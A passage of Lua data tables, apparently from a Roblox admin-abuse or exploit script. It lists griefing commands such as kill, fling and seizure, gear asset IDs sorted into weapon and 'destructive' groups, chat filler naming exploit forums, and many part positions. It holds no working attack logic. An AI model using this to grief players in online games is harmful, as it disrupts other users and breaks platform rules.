{"commands","clear","fix","logs","m","h","kill","respawn","reload","paint","unpaint","powerjump","normaljump","glow","unglow","trip","skydive","unskydive","size","unsize","stun","unstun","jump","sit","trail","untrail","particle","unparticle","invisible","visible","explode","bonfire","fire","unfire","smoke","unsmoke","sparkles","unsparkle","ff","unff","punish","unpunish","freeze","thaw","heal","god","ungod","ambient","outdoorambient","colorshiftbottom","colorshifttop","brightness","time","fogcolor","fogend","fogstart","removetools","damage","grav","setgrav","nograv","health","speed","name","unname","teleport","infect","rainbowify","flashify","noobify","ghostify","goldify","shiny","normal","package","unpackage","blind","unblind","guifix","fling","seizure","music","stopmusic","lock","unlock","removelimbs","jail","unjail","fly","unfly","noclip","clip","pm","dog","undog","creeper","uncreeper","char","unchar","rank","sword","powerjump","bighead","normalhead","minihead","spin","disco","flash","musiclist","packagelist","facelist","cape","uncape","hat","unspin","undisco","unflash","package","unpackage","gear","hat","unhat","shirt","unshirt","tshirt","untshirt","pants","unpants","face","swagify","clone","unclone","removejails","removeclones"}, aliases = {"cmds", "clr", "vis", "invis", "message", "hint", "reset", "tp"}}
		local meleecodes = {121946387,12187348,170897263,427947884,306971294,306971294,11999235,28275809,10758456,243790334,14719505,13207169,11956382,10469910,124472052,20721924}
		local guncodes = {243007180,116693764,212296936,168143042,467138029,42845609,130113146,26017478,26014536,9360722592,18268645}
		local fungears = {111876831,90718686,283755431,139578061,90718686,212641536,392057539,323477973,78730532,47597835,212641536,88143093,73265108,115377964,98411393}
		local explosivecodes = {88885539,88885524,73888479,110337853,101110605,29957963,503955938,243788010,88146497}
		local destructivecodes = {125013830,225921650,60357972,108158379}
		local swordcodes = {25740034,638089422,170903610,319655422,125013769,108158379,2470750640,2041982658,361950297,2103274863,181356054,163491866,108158439}
		local rideablecodes = {304719869,2568114215,158069143,185422295,346687565,553939167,820013867,387285940,163348575,206799274,928805891,124127383,125013849,2445089071,253519495}
		local words = {"drop","crude","cmdy","hi","imagine", "thats crazy ngl", "scv2??", "random name", "ok buddy", "sus", "amogus", "!!!!!", "????", "fr", "what", "bro", "quiving 9135", ":flushed:", "me_bad", "skid", "mommy", "daddy", "rt", "bump", "v3rm", "REAL", "capybara hub", "kozy hub", "floppa", "cmere"}
		local ogcframes = {
			["SmoothBlockModel178"] = {-13.0650005, 45.4300003, 57.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel176"] = {-15.0650005, 37.6300011, 51.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel140"] = {-13.0650005, 37.0300026, 57.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel137"] = {-19.0650005, 31.0300007, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel135"] = {-11.0650005, 36.4300003, 57.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel131"] = {-15.0650005, 37.6300011, 57.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel129"] = {-17.0650005, 38.2300034, 54.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel124"] = {-30.0650005, 38.2300034, 48.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel123"] = {-9.06500053, 25.0300007, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel118"] = {-11.0650005, 36.4300003, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel117"] = {-3.06500006, 13.6300011, 63.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel116"] = {-3.06500006, 13.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel128"] = {-21.0650005, 32.2300034, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel110"] = {-25.0650005, 34.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel105"] = {-57.0650024, 13.6300011, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel125"] = {-17.0650005, 29.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel104"] = {-7.06500053, 23.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel119"] = {-30.0650005, 37.0300026, 54.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel100"] = {-5.06500006, 22.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel97"] = {-41.0650024, 19.6300011, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel89"] = {-3.06500006, 15.4300003, 61.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel88"] = {-13.0650005, 27.4300022, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel147"] = {-57.0650024, 18.4300003, 73.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel160"] = {-15.0650005, 45.4300003, 51.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel84"] = {-35.0650024, 34.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel81"] = {-3.06500006, 5.23000002, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel80"] = {-57.0650024, 21.4300003, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel111"] = {-37.0650024, 33.4300003, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel87"] = {-15.0650005, 28.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel78"] = {-41.0650024, 31.0300007, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel77"] = {-39.0650024, 32.2300034, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel165"] = {-11.0650005, 45.4300003, 53.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel76"] = {-35.0650024, 34.6300011, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel75"] = {-30.0650005, 28.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel106"] = {-57.0650024, 15.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel74"] = {-39.0650024, 32.2300034, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel69"] = {-3.06500006, 13.6300011, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel67"] = {-16.0650005, 15.4300003, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel98"] = {-30.0650005, 26.2300014, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel66"] = {-57.5650024, 7.03000021, 61.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel65"] = {-3.06500006, 13.6300011, 58.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel63"] = {-33.0650024, 35.8300018, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel62"] = {-33.0650024, 35.8300018, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel68"] = {-30.0650005, 31.0300007, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel109"] = {-30.0650005, 37.0300026, 66.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel162"] = {-17.0650005, 45.4300003, 55.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel61"] = {-35.0650024, 34.6300011, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel58"] = {-43.0650024, 29.8300018, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel57"] = {-3.06500006, 10.0300007, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel55"] = {-55.0650024, 22.6300011, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel108"] = {-3.06500006, 15.4300003, 72.3430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel48"] = {-57.0650024, 11.2300005, 50.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel102"] = {-3.06500006, 21.4300003, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel46"] = {-38.5650024, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel44"] = {-51.0650024, 25.0300007, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel43"] = {-22.5650005, 10.0300007, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel41"] = {-30.0650005, 21.4300003, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel39"] = {-57.0650024, 13.6300011, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel82"] = {-57.0650024, 10.0300007, 64.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel127"] = {-23.0650005, 33.4300003, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel95"] = {-27.0650005, 35.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel114"] = {-30.0650005, 34.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel37"] = {-30.0650005, 23.8300018, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel36"] = {-30.0650005, 33.4300003, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel130"] = {-13.0650005, 37.0300026, 51.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel56"] = {-30.0650005, 29.8300018, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel53"] = {-19.0650005, 7.03000021, 44.7430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel35"] = {-57.0650024, 13.6300011, 58.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel34"] = {-45.0650024, 28.6300011, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel32"] = {-43.0650024, 29.8300018, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel54"] = {-39.0650024, 32.2300034, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel120"] = {-30.0650005, 38.2300034, 60.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel49"] = {-57.0650024, 15.4300003, 58.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel29"] = {-30.0650005, 15.4300003, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel27"] = {-41.0650024, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel26"] = {-30.0650005, 32.2300034, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel51"] = {-30.0650005, 27.4300022, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel21"] = {-47.0650024, 27.4300022, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel17"] = {-49.0650024, 26.2300014, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel83"] = {-19.0650005, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel16"] = {-47.0650024, 27.4300022, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel50"] = {-21.5650005, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel115"] = {-3.06500006, 15.4300003, 58.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel15"] = {-50.5650024, 11.2300005, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel14"] = {-30.0650005, 9.43000031, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel13"] = {-44.0650024, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel42"] = {-41.0650024, 31.0300007, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel12"] = {-53.0650024, 23.8300018, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel64"] = {-57.0650024, 13.6300011, 63.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel11"] = {-50.5650024, 5.23000002, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel28"] = {-49.0650024, 26.2300014, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel113"] = {-3.06500006, 11.2300005, 51.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel10"] = {-44.5650024, 8.2300005, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel7"] = {-43.5650024, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel6"] = {-57.0650024, 21.4300003, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel99"] = {-2.56500006, 7.03000021, 61.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel143"] = {-30.0650005, 37.0300026, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel3"] = {-41.0650024, 4.63000011, 44.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel122"] = {-3.06500006, 18.4300003, 73.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel9"] = {-41.0650024, 2.83000016, 42.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel19"] = {-51.0650024, 25.0300007, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel8"] = {-44.5650024, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel45"] = {-15.5650005, 10.0300007, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel72"] = {-15.5650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel18"] = {-51.0650024, 25.0300007, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel103"] = {-30.0650005, 25.0300007, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel33"] = {-55.0650024, 22.6300011, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel31"] = {-30.0650005, 18.4300003, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel71"] = {-3.06500006, 10.0300007, 64.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel30"] = {-30.0650005, 22.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel60"] = {-57.0650024, 15.4300003, 61.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel59"] = {-47.0650024, 27.4300022, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel86"] = {-11.0650005, 26.2300014, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel52"] = {-19.0650005, 19.6300011, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel23"] = {-45.0650024, 28.6300011, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel79"] = {-37.0650024, 33.4300003, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel4"] = {-37.5650024, 8.2300005, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel2"] = {-55.0650024, 22.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel20"] = {-20.5650005, 5.23000002, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel24"] = {-57.0650024, 10.0300007, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel47"] = {-53.0650024, 23.8300018, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel5"] = {-41.0650024, 1.63000011, 39.243, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel25"] = {-43.0650024, 29.8300018, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel70"] = {-8.56500053, 11.2300005, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel73"] = {-16.5650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel22"] = {-30.0650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel126"] = {-57.0650024, 5.23000002, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel1"] = {-41.0650024, 1.03000009, 37.243, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel232"] = {-30.1660023, 5.82995605, 70.4320068, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel231"] = {-43.0650024, 29.8300018, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel230"] = {-49.0650024, 26.2300014, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel229"] = {-53.0650024, 23.8300018, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel227"] = {-43.0650024, 29.8300018, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel226"] = {-30.0650005, 32.2300034, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel225"] = {-51.0650024, 25.0300007, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel224"] = {-50.5650024, 11.2300005, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel223"] = {-30.0650005, 34.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel222"] = {-55.0650024, 22.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel221"] = {-37.0650024, 33.4300003, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel218"] = {-44.0650024, 15.4300003, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel217"] = {-43.5650024, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel216"] = {-39.0650024, 32.2300034, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel214"] = {-35.0650024, 34.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel213"] = {-30.0650005, 31.0300007, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel211"] = {-30.0650005, 29.8300018, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel208"] = {-30.0650005, 26.2300014, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel204"] = {-22.5650005, 10.0300007, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel203"] = {-30.0650005, 23.8300018, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel201"] = {-30.1650009, 21.4300003, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel196"] = {-30.0650005, 9.43000031, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel193"] = {-43.0650024, 29.8300018, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel191"] = {-30.0650005, 18.4300003, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel187"] = {-33.0650024, 35.8300018, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel185"] = {-44.5650024, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel205"] = {-30.0650005, 15.4300003, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel197"] = {-30.0650005, 22.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel184"] = {-55.0650024, 22.6300011, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel180"] = {-33.0650024, 35.8300018, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel174"] = {-57.0650024, 10.0300007, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel171"] = {-57.0650024, 15.4300003, 83.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel167"] = {-47.0650024, 27.4300022, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel164"] = {-9.56500053, 11.2300005, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel161"] = {-3.06500006, 10.0300007, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel159"] = {-3.06500006, 13.6300011, 85.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel157"] = {-39.0650024, 32.2300034, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel155"] = {-30.0650005, 5.23000002, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel154"] = {-30.0650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel173"] = {-57.0650024, 13.6300011, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel152"] = {-41.0650024, 31.0300007, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel151"] = {-57.0650024, 21.4300003, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel150"] = {-57.5650024, 7.03000021, 83.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel206"] = {-37.5650024, 10.0300007, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel148"] = {-3.06500006, 10.0300007, 79.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel177"] = {-35.0650024, 34.6300011, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel144"] = {-3.06500006, 13.6300011, 80.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel198"] = {-16.0650005, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel142"] = {-3.06500006, 13.6300011, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel141"] = {-37.0650024, 33.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel138"] = {-55.0650024, 22.6300011, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel136"] = {-51.0650024, 25.0300007, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel134"] = {-3.06500006, 11.2300005, 93.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel133"] = {-47.0650024, 27.4300022, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel132"] = {-3.06500006, 15.4300003, 86.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel145"] = {-57.0650024, 10.0300007, 79.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel146"] = {-57.0650024, 13.6300011, 80.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel175"] = {-57.0650024, 13.6300011, 85.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel202"] = {-30.0650005, 38.2300034, 96.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel209"] = {-30.0650005, 25.0300007, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel168"] = {-39.0650024, 32.2300034, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel186"] = {-57.0650024, 11.2300005, 93.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel139"] = {-41.0650024, 31.0300007, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel188"] = {-30.0650005, 37.0300026, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel195"] = {-19.0650005, 7.03000021, 99.7430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel219"] = {-57.0650024, 21.4300003, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel200"] = {-51.0650024, 25.0300007, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel183"] = {-21.5650005, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel101"] = {-3.06500006, 15.4300003, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel207"] = {-30.0650005, 28.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel153"] = {-30.0650005, 37.0300026, 90.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel194"] = {-16.5650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel210"] = {-30.0650005, 27.4300022, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel181"] = {-41.0650024, 7.03000021, 99.7430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel93"] = {-57.0650024, 9.43000031, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel90"] = {-45.0650024, 28.6300011, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel156"] = {-35.0650024, 34.6300011, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel166"] = {-15.5650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel179"] = {-57.0650024, 15.4300003, 86.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel220"] = {-41.0650024, 31.0300007, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel163"] = {-49.0650024, 26.2300014, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel91"] = {-49.0650024, 26.2300014, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel228"] = {-41.0650024, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel94"] = {-30.0650005, 38.2300034, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel189"] = {-45.0650024, 28.6300011, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
